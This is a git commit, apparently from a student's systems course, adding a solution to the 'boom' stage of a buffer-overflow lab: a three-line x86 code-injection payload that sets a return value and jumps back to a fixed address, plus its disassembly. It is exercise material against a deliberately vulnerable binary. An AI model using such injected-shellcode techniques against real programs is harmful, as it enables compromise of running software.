dc7b49870ca397155c22114056bc33c20af99a32
lry89757 <lry89757@gmail.com>
2022-06-15 00:26:40 +0800

    :beers:&&:zap: Finish the boom of lab03 happily

---
+++ LAB3/lab3-程序包/boom.s
@@ -0,0 +1,3 @@
+mov $0x606b1729, %eax
+push $0x8048e81
+ret
---
+++ LAB3/lab3-程序包/boom_.asm
@@ -0,0 +1,10 @@
+
+boom.o:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+00000000 <.text>:
+   0:	b8 29 17 6b 60       	mov    $0x606b1729,%eax
+   5:	68 81 8e 04 08       	push   $0x8048e81
+   a:	c3                   	ret    
